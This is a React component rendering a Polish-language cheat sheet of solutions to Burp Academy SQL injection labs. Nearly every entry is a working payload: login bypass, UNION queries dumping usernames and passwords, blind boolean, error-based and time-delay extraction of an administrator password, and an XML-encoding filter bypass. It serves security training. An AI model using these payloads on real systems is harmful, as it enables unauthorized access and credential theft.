const SQL = () =>{
    return(
        <details>
            <summary>SQL - injection</summary>

                            <details>
                                <summary>SQL injection WHERE umożliwiająca pobieranie ukrytych danych - BurpAcademy</summary>
                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>' or 1=1--</p>
                                    <br/>
                                    <p>URL encoding</p>
                                    <p><span className='important'>%27+or+1=1--</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection umożliwiająca ominięcie logowania - BurpAcademy</summary>
                                <p>Sprawdzenie podatności sql injection w polu login <span className='important'>'</span></p>
                                <p>otrzymujemy <span className='important'>Internal Server Error</span></p>
                                <p>Mamy tutaj case <span className='important'>SELECT firstname FROM users WHERE username='{`<LOGIN>`}' AND password={`<PASSWORD>`}</span></p>

                                <div className='waring'>
                                      <p className='result'>Rozwiązanie:</p>
                                      <p>Pole login <span className='important'>administrator'-- </span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection zwracającą typ i wersję bazy danych w systemie Oracle - BurpAcademy</summary>
                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>Injection - <span className='important'>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection zwracającą typ i wersję bazy danych w systemie MySQL and Microsoft - BurpAcademy</summary>
                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>Injection - <span className='important'>'+UNION+SELECT+@@version,+NULL#</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection wyświetlaniu zawartości bazy danych w bazach danych innych niż Oracle - BurpAcademy</summary>
                                <div className='waring'>
                                    <p>Określ liczbę kolumn zwracanych przez zapytanie i które kolumny zawierają dane tekstowe - <span className='important'>'+UNION+SELECT+'abc','def'--</span></p>
                                </div>
                                <div className='waring'>
                                    <p>Pobranie listy tabel w bazie danych - <span className='important'>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</span></p>
                                    <p>Pobranie listy column w tabeli danych userów - <span className='important'>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</span></p>
                                </div>

                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p><span className='important'>'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection wyświetlaniu zawartości bazy danych w bazie Oracle - BurpAcademy</summary>
                                <div className='waring'>
                                    <p>Określ liczbę kolumn zwracanych przez zapytanie i które kolumny zawierają dane tekstowe - <span className='important'>'+UNION+SELECT+'abc','def'+FROM+dual--</span></p>
                                </div>
                                <div className='waring'>
                                    <p>Pobranie listy tabel w bazie danych - <span className='important'>'+UNION+SELECT+table_name,NULL+FROM+all_tables--</span></p>
                                    <p>Pobranie listy column w tabeli danych userów - <span className='important'>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--</span></p>
                                </div>

                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p><span className='important'>'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection UNION, polegający na określeniu liczby kolumn zwróconych przez zapytanie - BurpAcademy</summary>
                                <div className='waring'>
                                    <p>Dodajemy wartości NULL - <span className='important'>'+UNION+SELECT+NULL,NULL--</span></p>
                                </div>
                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>'+UNION+SELECT+NULL,NULL,NULL--</p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL injection UNION, znalezienie kolumny zawierającej tekst - BurpAcademy</summary>
                                <div className='waring'>
                                    <p>Dodajemy wartości NULL - <span className='important'>'+UNION+SELECT+NULL,NULL--</span></p>
                                     <p>'+UNION+SELECT+NULL,NULL,NULL--</p>
                                     <p>Zamieniamy NULL na wartość string <span className='important'>'example'</span></p>
                                </div>
                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>'+UNION+SELECT+NULL,'test',NULL--</p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL Injection UNION, pobieranie danych z innych tabel - BurpAcademy</summary>

                                <div className='waring'>
                                    <p>Weryfikujemy pola <span className='important'>'+UNION+SELECT+'abc','def'--</span></p>
                                </div>

                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>'+UNION+SELECT+username,+password+FROM+users--</p>
                                </div>
                            </details>

                            <details>
                                <summary>SQL Injection UNION, pobieranie wielu wartości w jednej kolumnie - BurpAcademy</summary>


                                <div className='waring'>
                                    <p>Weryfikujemy pola <span className='important'>'+UNION+SELECT+NULL,'abc'--</span></p>
                                </div>

                                <div className='waring'>
                                    <p className='result'>Rozwiązanie:</p>
                                    <p>'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</p>
                                </div>
                            </details>
                            
                            <details>
                                <summary>Blind SQL Injection z odpowiedziami warunkowymi - BurpAcademy</summary>

                                <p>Możliwy SQL Injection w <span className='important'>TrackingId</span> cookie</p>
                                <div className="waring">
                                    <p>Sprawdzamy czy injection jest podatny na zapytania true/ false (Wyświetlanie "Welcome back" na stronie)</p>
                                    <p><span className="important">' AND '1'='1</span></p>
                                    <p><span className="important">' AND '1'='2</span></p>
                                    <br />
                                    <p>Sprawdzamy czy istnieje tablica <span className="important">users</span></p>
                                    <p><span className="important">' AND (SELECT 'a' FROM users LIMIT 1)='a</span></p>
                                    <br />
                                    <p>Sprawdzamy czy istnieje user <span className="important">administrator</span></p>
                                    <p><span className="important">' AND (SELECT 'a' FROM users WHERE username='administrator')='a</span></p>
                                    <br />
                                    <p>Sprawdzamy długość hasła dla <span className="important">administrator</span></p>
                                    <p><span className="important">' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){`>`}1)='a</span></p>
                                    <p><span className="important">' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){`>`}2)='a</span></p>
                                    <p><span className="important">' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){`>`}3)='a</span></p>
                                    <br />
                                    <p className="result">Rozwiązanie: </p>
                                    <p>Sprawdzamy każdą literę pierwszą/ drugą ... literę hasła dla <span className="important">administrator</span> aż otrzymamy <span className="important">true</span> i sprawdzamy każdą kolejną</p>
                                    <p><span className="important">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</span></p>
                                    <p><span className="important">' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§</span></p>
                                    <p><span className="important">' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='§a§</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>Blind SQL Injection z odpowiedziami warunkowymi na podstawie błędów - BurpAcademy</summary>

                                <p>Możliwy SQL Injection w <span className='important'>TrackingId</span> cookie</p>
                                <div className="waring">
                                    <p>Sprawdzamy czy injection jest podatny na zapytania true/ false (Wyświetlanie "Internal Server Error" na stronie błąd 500)</p>
                                    <p><span className="important">'</span></p>
                                    <p><span className="important">''</span></p>
                                    <br />
                                    <p>Teraz musisz potwierdzić, że serwer interpretuje wstrzyknięcie jako zapytanie SQL, tj. że błąd jest błędem składni SQL, a nie jakimkolwiek innym rodzajem błędu. Aby to zrobić, musisz najpierw skonstruować podzapytanie przy użyciu prawidłowej składni SQL</p>
                                    <p><span className="important">'||(SELECT '')||'</span></p>
                                    <p><u>W tym przypadku zauważ, że zapytanie nadal wydaje się być nieprawidłowe. Może to być spowodowane typem bazy danych — spróbuj określić przewidywalną nazwę tabeli w zapytaniu:</u></p>
                                    <p><span className="important">'||(SELECT '' FROM dual)||'</span></p>
                                    <p>Stwórzmy poprawne zapytanie z warunkiem</p>
                                    <p><span className="important">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></p>
                                    <p>Sprawdźmy również czy niepoprawne działa jak należy</p>
                                    <p><span className="important">'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></p>
                                    <br />
                                    <p>Sprawdzamy czy istnieje user <span className="important">administrator</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <br />
                                    <p>Sprawdzamy długość hasła dla <span className="important">administrator</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN LENGTH(password){`>`}1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN LENGTH(password){`>`}2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN LENGTH(password){`>`}3 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <br />
                                    <p className="result">Rozwiązanie: </p>
                                    <p>Sprawdzamy każdą literę pierwszą/ drugą ... literę hasła dla <span className="important">administrator</span> aż otrzymamy <span className="important">true</span> i sprawdzamy każdą kolejną</p>
                                    <p><span className="important">'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                    <p><span className="important">'||(SELECT CASE WHEN SUBSTR(password,3,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span></p>
                                </div>
                            </details>

                            <details>
                                <summary>Blind SQL Injection widoczny błąd oparty na wstrzykiwaniu - BurpAcademy</summary>

                                <p>Możliwy SQL Injection w <span className='important'>TrackingId</span> cookie</p>
                                <div className="waring">
                                    <p>Sprawdzamy czy injection jest podatny na zapytania true/ false (Wyświetlanie "Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'NieIUjWk5IdWfSET''. Expected char")</p>
                                    <p><span className="important">'</span></p>
                                    <p><span className="important">'--</span></p>
                                    <p><span className="important">' AND 1=CAST((SELECT 1) AS int)--</span></p>
                                    <p><span className="important">' AND 1=CAST((SELECT username FROM users) AS int)--</span></p>
                                    <br />
                                    <p>Otrzymujemy błąd limitu znaków, co oznacza że trzeba wyciąć zawartość <span className='important'>TrackingId</span> i zostawić jedynie Injection</p>
                                    <p><span className="important">TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--</span></p>
                                    <p>Otrzymujemy błąd limitu</p>
                                    <br />
                                    <p><span className="important">TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></p>
                                    <p>Teraz wiemy że pierwszy w tabeli jest administrator poprzez wyświetlony błąd <span className="error">"ERROR: invalid input syntax for type integer: "administrator"</span></p>
                                    <br />
                                    <p className="result">Rozwiązanie: </p>
                                    <p>TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</p>
                                    <p><u>Otrzymujemy hasło wyświetlone w błędzie</u></p>
                                </div>
                            </details>

                            <details>
                                <summary>Blind SQL Injection z opóźnieniami czasowymi - BurpAcademy</summary>

                                <p>Możliwy SQL Injection w <span className='important'>TrackingId</span> cookie</p>
                                <div className="waring">
                                    <p className="result">Rozwiązanie: </p>
                                    <p>'||pg_sleep(10)--</p>
                                </div>
                            </details>

                            <details>
                                <summary>Blind SQL Injection z opóźnieniami czasowymi i pobieraniem informacji - BurpAcademy</summary>

                                <p>Możliwy SQL Injection w <span className='important'>TrackingId</span> cookie</p>
                                <div className="waring">
                                    <p>Sprawdzamy czy injection jest podatny na zapytania z opóźnieniem</p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></p>
                                    <br />
                                    <p>Sprawdzamy czy istnieje user <span className="important">administrator</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <br />
                                    <p>Sprawdzamy długość hasła dla <span className="important">administrator</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password){`>`}1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password){`>`}2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password){`>`}3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <br />
                                    <p className="result">Rozwiązanie: </p>
                                    <p>Sprawdzamy każdą literę pierwszą/ drugą ... literę hasła dla <span className="important">administrator</span> aż otrzymamy <span className="important">true</span> i sprawdzamy każdą kolejną</p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                    <p><span className="important">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,3,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></p>
                                </div>
                            </details>

                            <details>
                                <summary> SQL Injection z pominięciem filtra za pomocą kodowania XML - BurpAcademy</summary>

                                <div className="waring">
                                    <p>Umieszczamy Injection w request XML (zakodowane w HTML)</p>
                                    1 {`&#x53;ELECT`}
                                    <p>UNION SELECT username FROM users</p>
                                    <br/>
                                    <p className="result">Rozwiązanie: </p>
                                    <p>{`&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;`}</p>
                                    <p>{`&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;`}</p>
                                </div>
                            </details>

                        </details>
    )
}

export default SQL;